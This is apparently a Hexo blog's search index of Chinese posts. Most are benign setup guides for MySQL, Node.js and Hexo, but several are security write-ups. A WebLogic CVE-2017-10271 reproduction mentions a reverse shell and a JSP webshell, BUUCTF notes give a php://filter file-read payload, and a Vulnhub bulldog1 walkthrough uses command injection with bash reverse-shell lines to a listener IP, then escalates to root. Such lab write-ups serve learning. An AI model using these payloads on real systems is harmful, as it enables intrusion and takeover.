src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.1.png"></p></div><p>发送包后，监听服务器会得到远程shell</p><div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.2.png"></p></div>方法二：可以直接使用Java反序列化工具上传jsp木马<div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p></div>通过工具链接，直接拿到shell,因为木马是哥斯拉生成的，就用哥斯拉连接了。<div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p></div>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF刷题笔记WEB篇</title>
      <link href="2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/"/>
      <url>2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>BUUCTF–WEB</p><a id="more"></a><h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>进入链接查看源码可以看到有一个隐藏了都超链接，进入看一下</p><p><img src="/2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/1.png"></p><p>进入php文件后，按照提示点击select跳转后查阅结束。</p><p><img src="/2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/2.png"></p><p>抓包看一下中间存在跳转链接，查看内容。</p><p><img src="/2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/3.png"></p><p>代码审计，提示flag在flag.php文件里，代码没有过滤file函数。</p><p><img src="/2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/5.png"></p><p>利用file函数和伪协议构造peyload</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以base64编码的方式读取到了php文件，进行解码看到flag。</p><p><img src="/2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/6.png"></p><h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>进入题目链接查看源代码发现source.php目录<br><img src="/2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/7.png"><br>查看源代码，文件包含，先分析这三行，要求全为真。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">//file变量不为空</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">// file变量不是字符串</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment">// 将file变量传递给emmm类的checkFile函数</span>    <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac安装mysql</title>
      <link href="2020/mac%E5%AE%89%E8%A3%85mysql/"/>
      <url>2020/mac%E5%AE%89%E8%A3%85mysql/</url>
      
        <content type="html"><![CDATA[<p>Mac安装mysql</p><a id="more"></a><p>brew 安装mysql</p><pre class="line-numbers language-none"><code class="language-none">brew install mysql <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动mysql服务</p><pre class="line-numbers language-none"><code class="language-none">mysql.server start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置mysql</p><pre class="line-numbers language-none"><code class="language-none">mysql_secure_installation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按照提示一路配置下来就完成了。</p><pre class="line-numbers language-none"><code class="language-none">mysql -uroot -p <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入密码成功进入mysql</p><p><img src="/2020/mac%E5%AE%89%E8%A3%85mysql/1.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Mac </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac升级node.js到最新版</title>
      <link href="2020/MAC%E5%8D%87%E7%BA%A7node-js%E5%88%B0%E6%9C%80%E6%96%B0%E7%89%88/"/>
      <url>2020/MAC%E5%8D%87%E7%BA%A7node-js%E5%88%B0%E6%9C%80%E6%96%B0%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p>Mac 升级nodejs到最新版</p><a id="more"></a><p>查看本级nodejs版本</p><pre class="line-numbers language-none"><code class="language-none">node -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>清除cache</p><pre class="line-numbers language-none"><code class="language-none">sudo npm cache clean -f <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/MAC%E5%8D%87%E7%BA%A7node-js%E5%88%B0%E6%9C%80%E6%96%B0%E7%89%88/1.png"></p><p> 安装管理工具<code>n</code></p><pre class="line-numbers language-none"><code class="language-none">sudo npm install -g n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装最新版本nodejs</p><pre class="line-numbers language-none"><code class="language-none">sudo n stable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看主机是否更新为最新版本</p><pre class="line-numbers language-none"><code class="language-none">node -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub渗透测试（一）：bulldog1</title>
      <link href="2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/"/>
      <url>2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/</url>
      
        <content type="html"><![CDATA[<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>靶机难度： 初级<br>攻击机：macos<br>靶机：bulldog 1  <a href="https://www.vulnhub.com/entry/bulldog-1,211/">下载地址</a></p><a id="more"></a><h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><h3 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1.信息搜集"></a>1.信息搜集</h3><p>virtualbox启动bulldog环境，界面给出了靶机IP地址。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/1.png"></p></div><p>使用nmap扫描靶机开启的端口和服务。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/2.png"></p></div><p>可以看到80和8080端口有web服务，访问看看。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/3.png"></p></div><h3 id="2-漏洞挖掘"><a href="#2-漏洞挖掘" class="headerlink" title="2.漏洞挖掘"></a>2.漏洞挖掘</h3><p>使用AWVS对目标站点进行扫描，查看目录结构。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/4.png"></p></div><p>目录不多挨个查看，admin目录下是登陆页面，注入和绕过简单测了一下没发现有漏洞。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/5.png"></p></div><p>DEV目录下大篇的英文得到信息：网站没有php，纯django开发，其中有一个shell界面显示要先进行身份验证，并在网页源码中发现邮箱地址和加密密码。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/7.png"><br><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/6.png"></p></div><p>对七条密文进行md5解密，只有两条能解出来😩。</p><ul><li>d8b8dd5e7f000b8dea26ef8428caf38c04466b3e–&gt;bulldoglover</li><li>ddf45997a7e18a25ad5f5cf222da64814dd060d5–&gt;bulldog</li></ul><p>利用前面的邮箱用户名和解密后的密码尝试进行登陆，登录成功但是提示无操作权限。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/8.png"></p></div><p>登录后思路就断了，翻来翻去发现前面的shell界面登录后身份验证就通过了，利用<code>&amp;&amp;</code>绕过白名单，确定此处存在命令注入。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/9.png"></p></div><p>攻击机利用nc监听端口，shell界面使用<code>ls &amp;&amp; bash -i &gt;&amp; /dev/tcp/192.168.0.7/12345 0&gt;&amp;1</code>反弹shell结果。。。。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/10.png"></p></div><p>最后利用echo使用<code>echo “bash -i &gt;&amp; /dev/etc/192.168.0.7/12345 0&gt;&amp;1” | bash</code>成功进行反弹。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/11.png"></p></div><h3 id="3-权限提升"><a href="#3-权限提升" class="headerlink" title="3.权限提升"></a>3.权限提升</h3><p>查看/etc/passwd 发现名为bulldogadmin和django的用户，用<code>find / -user bulldogadmin 2&gt;/dev/null</code>列出用户文件。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/12.png"></p></div><p>查看/home/bulldogadmin/.hiddenadmindirectory/customPermissionApp文件</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/13.png"></p></div><p>发现都是str，利用<code>strings</code>查看，反复分析后发现其中此处有问题，拼接后password被h打断，删除前后的h后得到字符串<code>SUPERultimatePASSWORDyouCANTget</code>。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/14.png"></p></div>想到23端口开启了ssh，于是ssh远程连接，用户名为bulldogadmin和django，密码用`SUPERultimatePASSWORDyouCANTget`分别尝试，django成功登陆，再用`sudo su -`将权限提升为root权限。<div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/15.png"></p></div>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速搭建hexo博客</title>
      <link href="2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/"/>
      <url>2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。<br> <a id="more"></a><br>由于我的环境是Windows，所以win环境的按着来就好了，Linux环境大同小异。<a href="https://hexo.io/zh-cn/docs/">Hexo手册</a></p><h2 id="一、安装基本环境"><a href="#一、安装基本环境" class="headerlink" title="一、安装基本环境"></a>一、安装基本环境</h2><h3 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1. 安装Git"></a>1. 安装Git</h3><p>Git 是目前比较流行的分布式版本控制系统，我们使用它与github进行交互</p><ul><li>下载对应版本的的git安装就好， <a href="https://gitforwindows.org/">下载地址</a></li><li>装后打开Git Bash 键入<code>git --version</code>可以查看版本号</li></ul><div align="center"><p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/1.png"></p></div><h3 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2. 安装Node.js"></a>2. 安装Node.js</h3><p>Node.js是一个Javascript运行环境，是一个让 JavaScript 运行在服务端的开发平台，我们用来快速生成博客的静态页面，LTS版本为长期支持版，CURRENT版本为最新版，任选一个正常安装即可<a href="https://nodejs.org/en/">下载地址</a>。</p><h2 id="二、开始本地搭建博客"><a href="#二、开始本地搭建博客" class="headerlink" title="二、开始本地搭建博客"></a>二、开始本地搭建博客</h2><h3 id="1-新建本地文件夹"><a href="#1-新建本地文件夹" class="headerlink" title="1. 新建本地文件夹"></a>1. 新建本地文件夹</h3><p>在本地新建一个文件夹用来储存我们的博客，Git Bash进入文件夹下，执行命令：<code>npm install hexo -g</code> 用来安装hexo，</p><h3 id="2-搭建本地服务"><a href="#2-搭建本地服务" class="headerlink" title="2. 搭建本地服务"></a>2. 搭建本地服务</h3><p>依次在本地文件夹根目录下执行以下命令初始化并生成服务。</p><pre class="line-numbers language-none"><code class="language-none">hexo init    # 初始化npm install    # 安装npm依赖包 hexo generate   # 生成静态网页hexo server    # 生成本地服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>全部执行成功后浏览器访问<a href="http://localhost:4000/">http://localhost:4000</a>,如果出现默认的hexo博客，那么我们本地搭建博客就完成了</p><div align="center"><p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/2.png"></p></div><h2 id="三、本地博客发布到网络上"><a href="#三、本地博客发布到网络上" class="headerlink" title="三、本地博客发布到网络上"></a>三、本地博客发布到网络上</h2><h3 id="1-创建Github远程仓库"><a href="#1-创建Github远程仓库" class="headerlink" title="1.创建Github远程仓库"></a>1.创建Github远程仓库</h3><ul><li>这里我们就要用到<a href="https://github.com/">github</a>了。</li><li>有账户的可以略过，没有账户的新建账户，并登录。</li><li>新建一个仓库，仓库名格式设置为：xxxx.github.io,其他可以不动。</li></ul><div align="center"><p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/3.png"></p></div><ul><li>之后我们就可以到如下界面，记录ssh的地址</li></ul><div align="center"><p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/4.png"></p></div>- 在更改本地目录下的_config.yml配置文件，最后加上.<pre class="line-numbers language-none"><code class="language-none">deploy:  type: git  repo: 这里填刚记录的ssh地址  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-将Hexo与-Github连接"><a href="#2-将Hexo与-Github连接" class="headerlink" title="2. 将Hexo与 Github连接"></a>2. 将Hexo与 Github连接</h3><ul><li>按照如下格式输入</li></ul><pre class="line-numbers language-none"><code class="language-none">git config --global user.name &quot;yourname&quot;git config --global user.email &quot;youremail&quot;ssh-keygen -t rsa -C &quot;youremail&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><div align="center"> <p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/5.png"></p></div><ul><li>接下来我们把生成的id_rsa.pub文件用文本编辑器打开，复制里面的内容绑定到GitHub上，标题随意。</li></ul><div align="center"> <p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/6.png"></p></div>点击新建ssh keys，title随便填，key填写id_rsa.pub的内容即可，应该会要求输入密码<ul><li>测试是否成功</li></ul><pre class="line-numbers language-none"><code class="language-none">ssh -T git@github.com   #注意这里的地址不用改<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提示Are you sure you want to continue connecting (yes/no)?时输入yes<br>当看到Hi Budtit! You’ve successfully authenticated, but GitHub does not provide shell access.时说明配置成功</p><h3 id="3-部署到github"><a href="#3-部署到github" class="headerlink" title="3. 部署到github"></a>3. 部署到github</h3><pre class="line-numbers language-none"><code class="language-none">hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果报错说not found git 我们执行以下命令：<code>npm install hexo-deployer-git --save</code> 安装插件，然后在执行上一步命令第一次部署应该会让登录，浏览yourname.github.io成功显示博客页</p><h2 id="四、写作并上传第一篇博客"><a href="#四、写作并上传第一篇博客" class="headerlink" title="四、写作并上传第一篇博客"></a>四、写作并上传第一篇博客</h2><h3 id="1-写作"><a href="#1-写作" class="headerlink" title="1. 写作"></a>1. 写作</h3><pre class="line-numbers language-none"><code class="language-none">hexo new [layout] &lt;title&gt;  #创建新文章<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><div align="center"><p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/7.png"></p></div>创建后会在本地目录生成测试.md文件，用markdown语法编辑文件后保存，建议每次写作后本地部署完成进入http://localhost:4000 查看无误后再上传。<pre class="line-numbers language-none"><code class="language-none">hexo server    # 本地服务部署  可简写为hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-上传"><a href="#2-上传" class="headerlink" title="2. 上传"></a>2. 上传</h3><p>依次执行命令，hexo的具体用法请查看官方文档 <a href="https://hexo.io/zh-cn/docs/">戳这里</a></p><pre class="line-numbers language-none"><code class="language-none">hexo clean    # 清除缓存hexo generate   # 生成静态页面  可简写为hexo ghexo deploy   # 部署博客  可简写为hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="五、解析私人域名"><a href="#五、解析私人域名" class="headerlink" title="五、解析私人域名"></a>五、解析私人域名</h2><p>这里就要买域名了，我这里是在腾讯买的，如图添加两条记录</p><div align="center"> <p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/8.png"></p></div><p>然后在本地博客目录下的source文件夹下新建名为CNAME的文件，其中写入域名</p><div align="center"> <p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/9.png"></p></div><p>最后在github库中的setting中的Custom domain下填写购买的域名,save保存。</p><div align="center"> <p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/10.png"></p></div><p>好了，域名配置完成。</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
